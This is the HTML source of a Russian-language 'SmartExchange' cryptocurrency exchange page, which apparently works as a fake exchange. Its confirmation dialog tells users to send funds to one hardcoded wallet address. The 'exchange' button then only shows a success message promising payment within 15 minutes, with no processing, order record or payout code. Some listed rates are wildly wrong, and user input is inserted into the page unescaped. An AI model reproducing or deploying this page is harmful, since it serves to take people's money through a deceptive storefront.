<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SmartExchange</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('background.jpg');
      background-size: cover;
      background-position: center;
    }

    .container {
      background-color: rgba(0, 0, 0, 0.7);
      max-width: 400px;
      margin: 80px auto;
      padding: 30px;
      border-radius: 20px;
      color: white;
      text-align: center;
      box-shadow: 0 0 15px #00ffcc;
    }

    select, input[type="number"], input[type="text"] {
      width: 100%;
      padding: 10px;
      margin: 12px 0;
      border-radius: 12px;
      border: none;
      font-size: 16px;
    }

    button {
      background-color: #00cc66;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 12px;
    }

    button:hover {
      background-color: #00994d;
    }

    .result {
      margin-top: 20px;
      font-weight: bold;
      font-size: 18px;
    }

    .support {
      position: fixed;
      bottom: 60px;
      right: 20px;
      background-color: #0077ff;
      color: white;
      padding: 12px 16px;
      border-radius: 25px;
      text-decoration: none;
      font-weight: bold;
      box-shadow: 0 0 10px #0077ff;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.8);
    }

    .modal-content {
      background-color: #222;
      color: white;
      margin: 15% auto;
      padding: 20px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .modal-content button {
      background-color: #00cc66;
    }

    .rates-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background-color: rgba(0, 0, 0, 0.85);
      color: #00ffcc;
      font-size: 14px;
      text-align: center;
      padding: 8px;
      font-family: monospace;
      white-space: nowrap;
      overflow-x: auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>SmartExchange</h1>
    <label>Вы отдаёте:</label>
    <select id="from">
      <option>USDT</option><option>BTC</option><option>ETH</option><option>XRP</option><option>BNB</option>
    </select>

    <label>Сколько:</label>
    <input type="number" id="amount" placeholder="Введите сумму">

    <label>Вы получаете:</label>
    <select id="to">
      <option>XRP</option><option>USDT</option><option>BTC</option><option>ETH</option><option>BNB</option>
    </select>

    <button onclick="calculate()">Рассчитать</button>
    <div class="result" id="output">Вы получите: 0</div>

    <label>Ваш кошелёк для получения:</label>
    <input type="text" id="userWallet" placeholder="Вставьте адрес кошелька">

    <button onclick="showConfirm()">Обменять</button>
  </div>

  <!-- Support Button -->
  <a class="support" href="https://t.me/SmartExchangeSup" target="_blank">Support</a>

  <!-- Modal 1 -->
  <div id="confirmModal" class="modal">
    <div class="modal-content">
      <p><b>Подтвердите обмен:</b></p>
      <p id="exchangeDetails"></p>
      <p><b>Отправьте средства на:</b></p>
      <p style="word-break: break-all;">TU9bqAtsMzcB3PW6cg1hF4j2gFdVV8sRD9</p>
      <button onclick="confirmExchange()">Совершить обмен</button>
    </div>
  </div>

  <!-- Modal 2 -->
  <div id="successModal" class="modal">
    <div class="modal-content">
      <p>Заявка на обмен успешна ✅</p>
      <p>Ожидайте начисление в течение 15 минут.</p>
    </div>
  </div>

  <!-- Курс валют -->
  <div class="rates-bar" id="ratesBar">
    Загрузка курсов...
  </div>

  <script>
    let latestResult = 0;

    function calculate() {
      const from = document.getElementById("from").value;
      const to = document.getElementById("to").value;
      const amount = parseFloat(document.getElementById("amount").value);
      let rate = 1;

      if (from === "USDT" && to === "XRP") rate = 2.00;
      if (from === "BTC" && to === "USDT") rate = 106723;
      if (from === "ETH" && to === "USDT") rate = 2667.32;
      if (from === "XRP" && to === "USDT") rate = 0.38;
      if (from === "USDT" && to === "BNB") rate = 627.77;

      latestResult = amount * rate;
      document.getElementById("output").innerText = "Вы получите: " + latestResult.toFixed(2);
    }

    function showConfirm() {
      const from = document.getElementById("from").value;
      const to = document.getElementById("to").value;
      const amount = document.getElementById("amount").value;
      const wallet = document.getElementById("userWallet").value;

      if (!amount || !wallet) {
        alert("Введите сумму и кошелёк!");
        return;
      }

      const details = `Вы отдаёте: ${amount} ${from}, получаете: ${latestResult.toFixed(2)} ${to}<br>Кошелёк для получения: ${wallet}`;
      document.getElementById("exchangeDetails").innerHTML = details;
      document.getElementById("confirmModal").style.display = "block";
    }

    function confirmExchange() {
      document.getElementById("confirmModal").style.display = "none";
      document.getElementById("successModal").style.display = "block";
      setTimeout(() => {
        document.getElementById("successModal").style.display = "none";
      }, 5000);
    }

    window.onclick = function(event) {
      if (event.target.classList.contains('modal')) {
        document.getElementById("confirmModal").style.display = "none";
        document.getElementById("successModal").style.display = "none";
      }
    }

    function fetchRates() {
      const ids = 'bitcoin,ethereum,solana,ripple,toncoin,binancecoin,tron,litecoin';
      const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;

      fetch(url)
        .then(res => res.json())
        .then(data => {
          const bar = document.getElementById("ratesBar");
          bar.innerHTML = `
            BTC: $${data.bitcoin.usd} |
            ETH: $${data.ethereum.usd} |
            SOL: $${data.solana.usd} |
            XRP: $${data.ripple.usd} |
            TON: $${data.toncoin.usd} |
            BNB: $${data.binancecoin.usd} |
            TRX: $${data.tron.usd} |
            LTC: $${data.litecoin.usd}
          `;
        })
        .catch(() => {
          document.getElementById("ratesBar").innerText = "Не удалось загрузить курсы.";
        });
    }

    fetchRates();
    setInterval(fetchRates, 60000);
  </script>
</body>
</html>
